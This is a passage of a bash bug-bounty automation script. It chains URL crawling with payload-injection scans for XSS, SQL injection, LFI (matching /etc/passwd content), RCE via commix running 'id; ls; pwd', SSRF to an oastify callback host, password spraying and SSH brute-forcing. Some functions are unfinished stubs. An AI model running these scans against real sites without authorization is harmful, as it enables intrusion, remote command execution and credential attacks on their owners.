	# Check if the file exists and has 0 lines
    if [ ! -s "$VULNDIR/ssh-urls.txt" ]; then
        echo -e "${BRED}[x] SSH${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

	# cat ${VULNDIR}/ssh-urls.txt | interlace --silent -threads 10 -c "sshx -mode upc -ip _target_ -wordlist wordlists/ftp-username-password.txt > _output_/_cleantarget_.txt" -o ${FTP}

	# ssb -w wordlists/wordlist.txt -p 22 -t 1m -c 1000 -r 1 root@localhost

	STOP_SPINNER
	echo -e "${BGREEN}[+] SSH${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/ssh.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

S3SCANNER(){
	START_SPINNER "${BGREEN}S3SCANNER${RESET}"

	cat ${ROOT_SUBDOMAINDIR}/naabu.txt | s3scanner -bucket-file names.txt -enumerate | unew -el -t -q ${VULNDIR}/s3scanner.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] S3SCANNER${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/ssh.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

VULNTECHX(){
	START_SPINNER "${BGREEN}VULNTECHX${RESET}"

	if [ "$VULNTECHX_SCAN_MODE" = "NORMAL" ]; then
		cat ${ROOT_SUBDOMAINDIR}/httpx.txt | httpx -duc -silent -nc -td -t ${HTTPX_THREADS} | unew -el -i -t -q ${URLSDIR}/vulntechx_httpx.txt
	fi

	if [ "$VULNTECHX_SCAN_MODE" = "ADVANCED" ]; then
		cat ${ROOT_URLSDIR}/allurls.txt | cut -d"/" -f1-4 | unew -el -i -t -q ${URLSDIR}/vulntechx_dir.txt
		cat ${ROOT_URLSDIR}/allurls.txt | cut -d"/" -f1-5 | unew -el -i -t -q ${URLSDIR}/vulntechx_dir.txt
		cat ${ROOT_URLSDIR}/allurls.txt | cut -d"/" -f1-6 | unew -el -i -t -q ${URLSDIR}/vulntechx_dir.txt

		cat ${URLSDIR}/vulntechx_dir.txt | egrep -av '\?|=|/[0-9]' | grep -aEv '(-.*){2}' | awk -F/ '{if (index($NF, ".") == 0) print $0}' | awk -F/ '{if (length($NF) <= 15) print $0}' | sed 's/\(\/\|\/__\|\/_\)\s*$//' | awk -F'/' 'NF > 3' | unew -el -i -t -q ${URLSDIR}/vulntechx_dir_filter.txt
		cat ${URLSDIR}/vulntechx_dir_filter.txt | httpx -duc -silent -nc -td -t ${HTTPX_THREADS} | unew -el -i -t -q ${URLSDIR}/vulntechx_httpx.txt
	fi

	# Common steps for both conditions
	cat ${URLSDIR}/vulntechx_httpx.txt | vulntechx httpxjson -o ${VULNDIR}/httpxjson-output.json &>/dev/null
	vulntechx nuclei --file ${VULNDIR}/httpxjson-output.json --nucleicmd "nuclei -duc -nc -silent -tc {tech} -es ${VULNTECHX_NUCLEI_EXCLUDE_SEVERITY}" --process --parallel ${VULNTECHX_PARALLEL} --exclude-tech ${VULNTECHX_EXCLUDE_TECH} --append-output ${VULNDIR}/vulntechx.txt &>/dev/null

	# Check if the file has more than 0 lines
	if [ -f "${VULNDIR}/vulntechx.txt" ] && [ $(wc -l < "${VULNDIR}/vulntechx.txt") -gt 0 ]; then
	    cp "${VULNDIR}/vulntechx.txt" "${ROOT_VULNDIR}/vulntechx.txt"
	fi

	STOP_SPINNER
	echo -e "${BGREEN}[+] VULNTECHX${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/vulntechx.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

XSS(){
	START_SPINNER "${BGREEN}XSS${RESET}"

	if grep -qv "^rix4uni" "${XSS_WORDLIST}"; then
	  sed -i 's/^/rix4uni/' "${XSS_WORDLIST}"
	fi

	if [ "$XSS_SCAN_MODE" = "NORMAL" ]; then
		if [ "$USE_GFPATTERNS" = "TRUE" ]; then
			cat ${URLSDIR}/filteredurls.txt | gf xss | unew -el -t -q ${URLSDIR}/gf_xss.txt
			cat ${URLSDIR}/gf_xss.txt | pvreplace -silent -payload ${XSS_WORDLIST} -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -el -t -q ${VULNDIR}/xss_pvreplace.txt
		else
			# if USE_GFPATTERNS is FALSE then scan all parameters
			cat ${URLSDIR}/filteredurls.txt | pvreplace -silent -payload ${XSS_WORDLIST} -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -el -t -q ${VULNDIR}/xss_pvreplace.txt
		fi

		# Common steps for both TRUE and FALSE conditions
		cat ${VULNDIR}/xss_pvreplace.txt | xsschecker -nc -match 'rix4uni' -vuln -t ${XSSCHECKER_THREADS} -timeout ${XSSCHECKER_TIMEOUT} -retries ${XSSCHECKER_RETRIES} 2>/dev/null | sed 's/^Vulnerable: \[[^]]*\] \[[^]]*\] //' | unew -el -t -q ${VULNDIR}/xsschecker.txt
	fi

	if [ "$XSS_SCAN_MODE" = "ADVANCED" ]; then
		if [ "$USE_GFPATTERNS" = "TRUE" ]; then
			cat ${URLSDIR}/filteredurls.txt | gf xss | unew -el -t -q ${URLSDIR}/gf_xss.txt
			cat ${URLSDIR}/gf_xss.txt | pvreplace -silent -payload ${XSS_WORDLIST} -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -el -t -q ${VULNDIR}/xss_pvreplace.txt
		else
			# if USE_GFPATTERNS is FALSE then scan all parameters
			cat ${URLSDIR}/filteredurls.txt | pvreplace -silent -payload ${XSS_WORDLIST} -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -el -t -q ${VULNDIR}/xss_pvreplace.txt
		fi

		# Common steps for both TRUE and FALSE conditions
		cat ${VULNDIR}/xss_pvreplace.txt | xsschecker -nc -match 'rix4uni' -vuln -t ${XSSCHECKER_THREADS} -timeout ${XSSCHECKER_TIMEOUT} -retries ${XSSCHECKER_RETRIES} 2>/dev/null | sed 's/^Vulnerable: \[[^]]*\] \[[^]]*\] //' | unew -el -t -q ${VULNDIR}/xsschecker.txt

		# Checks XSS False Positive
		cat ${VULNDIR}/xsschecker.txt | unew -q -split ${XSSCHECKER_SPLIT} ${VULNDIR}/xsschecker_split.txt
		parallel --ungroup -j${PYXSS_PARALLEL_FILE_SCAN} "cat {} | pyxss --silent --no-color -o {= s:xsschecker_split:xss: =}" ::: ${VULNDIR}/xsschecker_split*.txt &>/dev/null
		cat ${VULNDIR}/xss[0-9]*.txt | egrep -av 'NOT VULNERABLE:' | unew -el -ef -q ${ROOT_VULNDIR}/xss.txt
	fi

	STOP_SPINNER
	echo -e "${BGREEN}[+] XSS${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/xss.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

ERRORBASEDSQLI(){
	START_SPINNER "${BGREEN}ERRORBASEDSQLI${RESET}"

	if [ "$USE_GFPATTERNS" = "TRUE" ]; then
		cat ${URLSDIR}/filteredurls.txt | gf sqli | unew -el -t -q ${URLSDIR}/gf_sqli.txt
		cat ${URLSDIR}/gf_sqli.txt | nuclei -duc -silent -nc -dast -t templates/error-based-sqli.yaml 2>/dev/null | unew -el -t -q ${VULNDIR}/errorbasedsqli.txt
	else
		# if USE_GFPATTERNS is FALSE then scan all parameters
		cat ${URLSDIR}/filteredurls.txt | nuclei -duc -silent -nc -dast -t templates/error-based-sqli.yaml 2>/dev/null | unew -el -t -q ${VULNDIR}/errorbasedsqli.txt
	fi

	# Check if the file has more than 0 lines
	if [ -f "${VULNDIR}/errorbasedsqli.txt" ] && [ $(wc -l < "${VULNDIR}/errorbasedsqli.txt") -gt 0 ]; then
	    cp "${VULNDIR}/errorbasedsqli.txt" "${ROOT_VULNDIR}/errorbasedsqli.txt"
	fi

	STOP_SPINNER
	echo -e "${BGREEN}[+] ERRORBASEDSQLI${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/errorbasedsqli.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

TIMEBASEDSQLI(){
	START_SPINNER "${BGREEN}TIMEBASEDSQLI${RESET}"

	if [ "$USE_GFPATTERNS" = "TRUE" ]; then
		cat ${URLSDIR}/filteredurls.txt | gf sqli | unew -el -t -q ${URLSDIR}/gf_sqli.txt
		cat ${URLSDIR}/gf_sqli.txt | pvreplace -silent -payload "*" -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -ef -el -t -q ${VULNDIR}/sqli_pvreplace.txt
	else
		# if USE_GFPATTERNS is FALSE then scan all parameters
		cat ${URLSDIR}/filteredurls.txt | pvreplace -silent -payload "*" -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -ef -el -t -q ${VULNDIR}/sqli_pvreplace.txt
	fi

	# Common steps for both TRUE and FALSE conditions
	gosqli -list ${VULNDIR}/sqli_pvreplace.txt -payload ${SQLI_WORDLIST} | tee -a ${VULNDIR}/sqli.txt

	# Check if the file has more than 0 lines
	if [ -f "${VULNDIR}/sqli.txt" ] && [ $(wc -l < "${VULNDIR}/sqli.txt") -gt 0 ]; then
		cat ${VULNDIR}/sqli.txt | grep -a "SQLI CONFIRMED:" | unew -el -t -q ${VULNDIR}/validsqli.txt
	    cp "${VULNDIR}/validsqli.txt" "${ROOT_VULNDIR}/validsqli.txt"
	fi

	# ghauri
	# sqlmap

	STOP_SPINNER
	echo -e "${BGREEN}[+] TIMEBASEDSQLI${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/validsqli.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

LFI(){
	START_SPINNER "${BGREEN}LFI${RESET}"

	# LINUX LFI
	if [ "$USE_GFPATTERNS" = "TRUE" ]; then
		cat ${URLSDIR}/filteredurls.txt | gf lfi | unew -el -t -q ${URLSDIR}/gf_lfi.txt
		cat ${URLSDIR}/gf_lfi.txt | pvreplace -silent -payload ${LFI_WORDLIST} -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -el -t -q ${VULNDIR}/lfi_pvreplace.txt
	else
		# if USE_GFPATTERNS is FALSE then scan all parameters	
		cat ${URLSDIR}/filteredurls.txt | pvreplace -silent -payload ${LFI_WORDLIST} -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -el -t -q ${VULNDIR}/lfi_pvreplace.txt
	fi

	# Common steps for both TRUE and FALSE conditions
	ffuf -v -u FUZZ -w ${VULNDIR}/lfi_pvreplace.txt -t 40 -rate 1000 -mr "root:[x*]:0:0" 2>/dev/null | unew -el -t -q ${VULNDIR}/ffuf_lfi.txt
	cat ${VULNDIR}/ffuf_lfi.txt | grep -a "| URL |" | sed 's/| URL | //' | unew -el -q ${VULNDIR}/lfi.txt

	# Check if the file has more than 0 lines
	if [ -f "${VULNDIR}/lfi.txt" ] && [ $(wc -l < "${VULNDIR}/lfi.txt") -gt 0 ]; then
	    cp "${VULNDIR}/lfi.txt" "${ROOT_VULNDIR}/lfi.txt"
	fi

	# WINDOWS LFI

	STOP_SPINNER
	echo -e "${BGREEN}[+] LFI${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/lfi.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

RCE(){
	START_SPINNER "${BGREEN}RCE${RESET}"

	if [ "$USE_GFPATTERNS" = "TRUE" ]; then
		cat ${URLSDIR}/filteredurls.txt | gf rce | unew -el -t -q ${URLSDIR}/gf_rce.txt
		cat ${URLSDIR}/gf_rce.txt | pvreplace -silent -payload id -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -el -t -q ${VULNDIR}/rce_pvreplace.txt
	else
		# if USE_GFPATTERNS is FALSE then scan all parameters
		cat ${URLSDIR}/filteredurls.txt | pvreplace -silent -payload id -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -el -t -q ${VULNDIR}/rce_pvreplace.txt
	fi

	# Common steps for both TRUE and FALSE conditions
	ffuf -s -u FUZZ -w ${VULNDIR}/rce_pvreplace.txt -mr "uid=\d+\(\w+-?\w*\) gid=\d+\(\w+-?\w*\) groups=\d+\(\w+-?\w*\)" | unew -el -t -q ${VULNDIR}/rce_ffuf.txt

	# Check if the file exists and has 0 lines
    if [ ! -s "${VULNDIR}/rce_ffuf.txt" ]; then
        echo -e "${BRED}[x] RCE${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

	# commix
	interlace --silent -tL ${URLSDIR}/filteredurls.txt -threads 1 -c "timelimitx -t ${COMMIX_TIMELIMITX} commix --batch -u \"_target_\" --output-dir vuln --os-cmd=\"id; ls; pwd\""

	# Check if the file has more than 0 lines
	if [ -f "${VULNDIR}/rce.txt" ] && [ $(wc -l < "${VULNDIR}/rce.txt") -gt 0 ]; then
	    cp "${VULNDIR}/rce.txt" "${ROOT_VULNDIR}/rce.txt"
	fi

	STOP_SPINNER
	echo -e "${BGREEN}[+] RCE${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/rce.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

SSTI(){
	# I will write later
	START_SPINNER "${BGREEN}RCE${RESET}"
	STOP_SPINNER
}

SSRF(){
	cat ${URLSDIR}/filteredurls.txt | pvreplace -silent -payload "http://sfsh.oastify.com" -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -ef -el -t -q ${VULNDIR}/ssrf_pvreplace.txt
	cat ${VULNDIR}/ssrf_pvreplace.txt | httpx -duc -silent -nc -fr | unew -ef -el -t -q ${VULNDIR}/ssrf.txt
}

OPEN_REDIRECT(){
	START_SPINNER "${BGREEN}OPEN_REDIRECT${RESET}"

	if [ "$USE_GFPATTERNS" = "TRUE" ]; then
		cat ${URLSDIR}/filteredurls.txt | gf redirect | pvreplace -silent -payload ${OPEN_REDIRECT_WORDLIST} -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -ef -el -q ${VULNDIR}/open_redirect_pvreplace.txt
	else
		# if USE_GFPATTERNS is FALSE then scan all parameters
		cat ${URLSDIR}/filteredurls.txt | pvreplace -silent -payload ${OPEN_REDIRECT_WORDLIST} -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -ef -el -q ${VULNDIR}/open_redirect_pvreplace.txt
	fi

	# Common steps for both TRUE and FALSE conditions
	cat ${VULNDIR}/open_redirect_pvreplace.txt | httpx -duc -silent -mc 301,302,303,307,308 | unew -ef -el -q ${ROOT_VULNDIR}/open_redirect.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] OPEN_REDIRECT${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/open_redirect.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

# DOTGIT(){
# 	START_SPINNER "${BGREEN}DOTGIT${RESET}"

# 	cat ${SUBDOMAINDIR}/alivesubs.txt | sed 's#$#/.git/config#g' | unew -el -t -q ${DOTGITDIR}/dotgit_subs.txt
# 	ffuf -s -u FUZZ -w ${DOTGITDIR}/dotgit_subs.txt -mr "\[core\]" | unew -el -t -q ${DOTGITDIR}/ffuf_dotgit.txt
# 	sed 's#/\.git/config$##' -i ${DOTGITDIR}/ffuf_dotgit.txt

# 	# Check if the file exists and has 0 lines
#     if [ ! -s "${DOTGITDIR}/ffuf_dotgit.txt" ]; then
#         echo -e "${BRED}[x] DOTGIT${RESET}: 0, ${TIME} seconds"
#         STOP_SPINNER
#         return
#     fi

# 	cat ${DOTGITDIR}/ffuf_dotgit.txt | interlace --silent -threads 1 -c "goop _target_ dotgit/goop/_cleantarget_" 2>/dev/null

# 	# gitrepoenum commit -i dotgit/goop -d all -o dotgit/commits
# 	# gitrepoenum code -i dotgit/goop -o dotgit/commits
# 	# gitrepoenum vuln -i dotgit/commits -o dotgit/commits

# 	# git -C acc.net/ --no-pager log --pretty=format:%H | xargs -I{} git -C acc.net/ --no-pager show {} | tee -a git-command-logs.txt

# 	STOP_SPINNER
# 	echo -e "${BGREEN}[+] DOTGIT${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/dotgit.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
# }

PDFTOTEXT(){
	START_SPINNER "${BGREEN}PDFTOTEXT${RESET}"

	# Check if the file exists and has 0 lines
    if [ ! -s "${ROOT_URLSDIR}/allurls.txt" ]; then
        echo -e "${BRED}[x] PDFTOTEXT${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

	cat ${ROOT_URLSDIR}/allurls.txt | grep -a "\.pdf$" | interlace --silent -threads 10 -c "curl -s _target_ | pdftotext - _output_/_cleantarget_.txt 2>/dev/null" -o ${PDFTOTEXTDIR} 2>> >(sed "s/^/${FUNCNAME[0]}: /" >> "$ERRORLOGFILE") >/dev/null
	find ${PDFTOTEXTDIR} -type f -print0 | xargs --null grep -a -Z -L -Eai 'internal use only|confidential' | xargs --null rm -rf

	STOP_SPINNER
	echo -e "${BGREEN}[+] PDFTOTEXT${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/pdftotext.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

JSLEAKS(){
	START_SPINNER "${BGREEN}JSLEAKS${RESET}"

	cat urls.txt | egrep -av "\.json" | grep -a "\.js" | linkinspector -silent -nc -mt "application/javascript" | awk '{print $1}' | unew -el -t -q js-links.txt
	cat js-links.txt | nuclei -duc -silent -nc -t ~/nuclei-templates/exposures/ | unew js-leaks.txt
	trufflehog
	secretfinder
	mantra

	STOP_SPINNER
	echo -e "${BGREEN}[+] JSLEAKS${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/jsleaks.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

JSONLEAKS(){
	START_SPINNER "${BGREEN}JSONLEAKS${RESET}"

	STOP_SPINNER
	echo -e "${BGREEN}[+] JSONLEAKS${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/jsonleaks.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

GITHUBLEAKS(){
	START_SPINNER "${BGREEN}GITHUBLEAKS${RESET}"

	STOP_SPINNER
	echo -e "${BGREEN}[+] GITHUBLEAKS${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/githubleaks.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

IIS(){
	START_SPINNER "${BGREEN}IIS${RESET}"

	if [ "$IIS_SCAN_MODE" = "NORMAL" ]; then
		cat ${ROOT_SUBDOMAINDIR}/httpx.txt | grep -aE "IIS|IIS Windows Server|Microsoft-IIS|Windows Server" | awk '{print $1}' | unew -el -t -q ${VULNDIR}/iis.txt
	fi

	if [ "$IIS_SCAN_MODE" = "ADVANCED" ]; then
		# Check if the file exists and has 0 lines
	    if [ ! -s "${ROOT_URLSDIR}/httpx.txt" ]; then
	    	cat ${ROOT_URLSDIR}/allurls.txt | httpx -duc -silent -nc -td -t ${HTTPX_THREADS} | unew -el -t -q ${ROOT_URLSDIR}/httpx.txt
	    fi

		cat ${ROOT_URLSDIR}/httpx.txt | grep -aE "IIS|IIS Windows Server|Microsoft-IIS|Windows Server" | awk '{print $1}' | unew -el -t -q ${VULNDIR}/iis.txt
	fi

	# Check if the file exists and has 0 lines
    if [ ! -s "$VULNDIR/iis.txt" ]; then
        echo -e "${BRED}[x] IIS${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

    # Run the commands if the file has content
	cat ${VULNDIR}/iis.txt | interlace --silent -threads 10 -c "shortscan _target_ -F -s -p 1 > _output_/_cleantarget_.txt" -o ${IISIDR} 2>> >(sed "s/^/${FUNCNAME[0]}: /" >> "$ERRORLOGFILE") >/dev/null
	find ${IISIDR}/*.txt -type f -print0 | xargs --null grep -a -Z -L 'Vulnerable: Yes' | xargs --null rm -rf

	STOP_SPINNER
	echo -e "${BGREEN}[+] IIS${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/iis.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

SWAGGERUI(){
	START_SPINNER "${BGREEN}SWAGGERUI${RESET}"

	cat ${ROOT_SUBDOMAINDIR}/httpx.txt | grep -aE "Swagger UI" | awk '{print $1}' | unew -el -t -q ${VULNDIR}/swaggerui.txt
	cat ${VULNDIR}/swaggerui.txt | nuclei -duc -silent -nc -t templates/swagger-ui-xss.yaml | sed -e 's/^\[swagger-ui-xss\] \[http\] \[medium\] //' -e 's/ \[ENDPOINT=.*$//' | unew -el -t -q ${VULNDIR}/swaggerui_nuclei.txt

	# False Positive Checking
	cat ${VULNDIR}/swaggerui_nuclei.txt | pyxss --silent --no-color -o ${VULNDIR}/swaggerui_xss.txt &>/dev/null

	# Check if the file has more than 0 lines
	if [ -f "${VULNDIR}/swaggerui_xss.txt" ] && [ $(wc -l < "${VULNDIR}/swaggerui_xss.txt") -gt 0 ]; then
		cat ${VULNDIR}/swaggerui_xss.txt | egrep -av "NOT VULNERABLE:" | unew -el -t -q ${VULNDIR}/swaggerui_xss.txt
	    cp "${VULNDIR}/swaggerui_xss.txt" "${ROOT_VULNDIR}/swaggerui_xss.txt"
	fi

	STOP_SPINNER
	echo -e "${BGREEN}[+] SWAGGERUI${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/swaggerui_xss.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

403_401_BYPASS(){
	START_SPINNER "${BGREEN}403_401_BYPASS${RESET}"

	STOP_SPINNER
	echo -e "${BGREEN}[+] 403_401_BYPASS${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/403_401_bypass.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# URLs Secrets
LINKINSPECTOR(){
	START_SPINNER "${BGREEN}LINKINSPECTOR${RESET}"

	cat urls.txt | linkinspector -silent -nc -append-output linkinspector.txt

	# Domain Backup Fuzz
	cat ${ROOT_SUBDOMAINDIR}/httpx.txt | awk -F' ' '{ if ($2 == "[403]" || $2 == "[404]" || $2 == "[302]") print $1 }' | unew -el -t -q notaccessible_subs.txt
	cat notaccessible_subs.txt | fuzzuli -sl -mt shuffle -jw | unew -el -t -q fuzzuli.txt
	cat fuzzuli.txt | linkinspector -silent -nc -mc 200,302 -append-output fuzzuli_linkinspector.txt


	cat notaccessible_subs.txt | wordgen -silent -path wordlists/words.txt -e ".rar, .zip, .tar.gz, .tar, .gz, .jar, .7z, .bz2, .sql, .backup, .war" | unew -el -t -q wordgen.txt
	cat wordgen.txt | linkinspector -silent -nc -mc 200,302 -append-output fuzzuli_linkinspector.txt

	cat notaccessible_subs.txt | interlace --silent -threads ${INTERLACE_THREADS} -c "ffuf -s -u _target_/FUZZ -w wordlists/onelistforallshort.txt -mc ${FFUFDIRENUM_STATUS_MATCH} -o _output_/_cleantarget_.json" -o ${SUBDOMAINDIR}/ffufdirenum

	STOP_SPINNER
	echo -e "${BGREEN}[+] LINKINSPECTOR${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/linkinspector.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Password spraying
BRUTESPRAY(){
	START_SPINNER "${BGREEN}BRUTESPRAY${RESET}"

	python3 brutespray.py --file nmap.gnmap -U /usr/share/wordlist/user.txt -P /usr/share/wordlist/pass.txt --threads 5 --hosts 5
	brutespray -f $dir/hosts/portscan_active.gnmap -T $BRUTESPRAY_CONCURRENCE -o $dir/vulns/brutespray 2>>"$ERRORLOGFILE" >/dev/null

	STOP_SPINNER
	echo -e "${BGREEN}[+] BRUTESPRAY${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/brutespray.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Delete TMPDIR files
DELETE_TMPDIR(){
	START_SPINNER "${BGREEN}DELETE_TMPDIR${RESET}"

	# if DELETE_TMPDIR is TRUE then delete large files
	if [ "$DELETE_TMPDIR" = "TRUE" ]; then
		rm -rf ${SUBDOMAINDIR}/altdns.subs
		rm -rf ${SUBDOMAINDIR}/puredns.subs
		rm -rf ${SUBDOMAINDIR}/alterx.subs
		rm -rf ${SUBDOMAINDIR}/gotator.subs
		rm -rf ${SUBDOMAINDIR}/dnsgen.subs
		rm -rf ${SUBDOMAINDIR}/goaltdns.subs
		rm -rf ${SUBDOMAINDIR}/ripgen.subs
		rm -rf ${SUBDOMAINDIR}/dnscewl.subs
		rm -rf ${SUBDOMAINDIR}/allpermutationssubs.txt
	fi

	STOP_SPINNER
	echo -e "${BGREEN}[+] DELETE_TMPDIR${RESET}: ${TIME} seconds"
}


RECON(){
	# Port Scanning
	run "NAABU"
	# run "MASSCAN"
	# run "RUSTSCAN"
	# run "NMAP"


	# Subdomain Probing
	run "HTTPX"


	# Directory Enumeration
	# run "FFUFDIRENUM"
	# run "DIRSEARCH"
	# run "FEROXBUSTER"
	# run "WFUZZ"


	# Email Enumeration
	# run "EMAILFINDER"


	# Url Crawling
	run "WAYMORE"
	run "HAKRAWLER"
	run "WAYBACKURLS"
	run "KATANA"
	run "GAU"
	# run "GOSPIDER"
	run "UFORALL"
	run "URLFINDER"
	run "GITHUB_ENDPOINTS"
	run "XURLFIND3R"
	run "XCRAWL3R"
	run "CRAWLEY"
	run "GOLINKFINDER"
	# run "GALER # Taking too much ram need to be fixed"
	# run "PATHFINDER"
	run "PATHCRAWLER"
	run "ROBOXTRACTOR"
	run "ROBOTXT"


	# Google Dorking
	# run "AUTOMATED_GOOGLE_DORKING"
	# run "MANUAL_GOOGLE_DORKING"


	# JS Crawling
	run "SUBJS"
	run "GETJS"
	run "JSCRAWLER"
	run "JSFINDER"
	# run "JAVASCRIPT_DEOBFUSCATOR"
	# run "LINKFINDER"
	run "XNLINKFINDER"
	# run "GETJSWORDS"
	run "SOURCEMAPPER"
	# run "LINX"
	# run "JSLUICE"


	# Hidden Parameter
	run "PARAMFINDER"
	# run "MSARJUN"
	# run "X8"
	run "ALLURLS"
	run "MANUAL_ALLURLS_FILTER"


	# Delete TMPDIR files
	run "DELETE_TMPDIR"
}

# Run functions based on selected recon mode
if [[ "$RECON_XSS" == true ]]; then
    RECON
    run "XSS"
    run "SWAGGERUI"
elif [[ "$RECON_SQLI" == true ]]; then
    RECON
    run "ERRORBASEDSQLI"
	# run "TIMEBASEDSQLI"
elif [[ "$RECON_LFI" == true ]]; then
    RECON
    run "LFI"
elif [[ "$RECON_SUBTAKEOVER" == true ]]; then
    RECON
    run "SUBZY"
	run "NUCLEI"
elif [[ "$RECON_RCE" == true ]]; then
    RECON
    run "RCE"
elif [[ "$RECON_IIS" == true ]]; then
    RECON
    run "IIS"
else
    # Default behavior: run all
	# Port Scanning
	run "NAABU"
	# run "MASSCAN"
	# run "RUSTSCAN"
	# run "NMAP"


	# Subdomain Probing
	run "HTTPX"


	# Directory Enumeration
	# run "FFUFDIRENUM"
	# run "DIRSEARCH"
	# run "FEROXBUSTER"
	# run "WFUZZ"


	# Email Enumeration
	# run "EMAILFINDER"


	# Url Crawling
	run "WAYMORE"
	run "HAKRAWLER"
	run "WAYBACKURLS"
	run "KATANA"
	run "GAU"
	# run "GOSPIDER"
	run "UFORALL"
	run "URLFINDER"
	run "GITHUB_ENDPOINTS"
	run "XURLFIND3R"
	run "XCRAWL3R"
	run "CRAWLEY"
	run "GOLINKFINDER"
	# run "GALER # Taking too much ram need to be fixed"
	# run "PATHFINDER"
	run "PATHCRAWLER"
	run "ROBOXTRACTOR"
	run "ROBOTXT"


	# Google Dorking
	# run "AUTOMATED_GOOGLE_DORKING"
	# run "MANUAL_GOOGLE_DORKING"


	# JS Crawling
	run "SUBJS"
	run "GETJS"
	run "JSCRAWLER"
	run "JSFINDER"
	# run "JAVASCRIPT_DEOBFUSCATOR"
	# run "LINKFINDER"
	run "XNLINKFINDER"
	# run "GETJSWORDS"
	run "SOURCEMAPPER"
	# run "LINX"
	# run "JSLUICE"


	# Hidden Parameter
	run "PARAMFINDER"
	# run "MSARJUN"
	# run "X8"
	run "ALLURLS"
	run "MANUAL_ALLURLS_FILTER"


	# Program Based Wordlist Generator
	# run "CEWL"
	# run "UNFURL"
	# run "CUSTOM_PARAM"
	# run "COOK"
	# run "PYDICTOR"


	# run "FFUF_CUSTOM_PARAM"


	# Subdomain Takeover
	run "SUBZY"
	run "NUCLEI"


	# MX Takeover
	run "MXTAKEOVER"

	# DNS takeover
	run "DNSTAKE"

	# Zone Transfer
	# run "DIG"


	# Vulnerability Scanning
	run "FTP"
	# run "SSH"
	run "VULNTECHX"
	# run "XSS"
	run "ERRORBASEDSQLI"
	# run "TIMEBASEDSQLI"
	# run "LFI"
	run "RCE"
	run "DOTGIT"
	run "PDFTOTEXT"
	# run "JSLEAKS"
	# run "JSONLEAKS"
	# run "GITHUBLEAKS"
	run "IIS"
	run "SWAGGERUI"
	# run "403_401_BYPASS"


	# URLs Secrets
	# run "LINKINSPECTOR"


	# Password spraying
	# run "BRUTESPRAY"


	# Delete TMPDIR files
	run "DELETE_TMPDIR"
fi


ENDED_AT=$(date +"%d-%m-%Y_%H:%M:%S")
END_EPOCH=$(date +%s)

DURATION=$(( END_EPOCH - START_EPOCH ))
TIMETOOK=$(printf "%02d:%02d:%02d" $((DURATION/3600)) $(( (DURATION%3600)/60 )) $((DURATION%60)) )

echo -e "${BGREEN}[+] STARTED${RESET}: ${STARTED_AT}, ${BGREEN}FINISHED${RESET}: ${ENDED_AT}, ${BGREEN}TIMETOOK${RESET}: ${TIMETOOK}" | unew -a $RESUMELOGFILE

echo -e "Scan finished: $TARGET" | notify -silent -duc -id xssnotify &>/dev/null
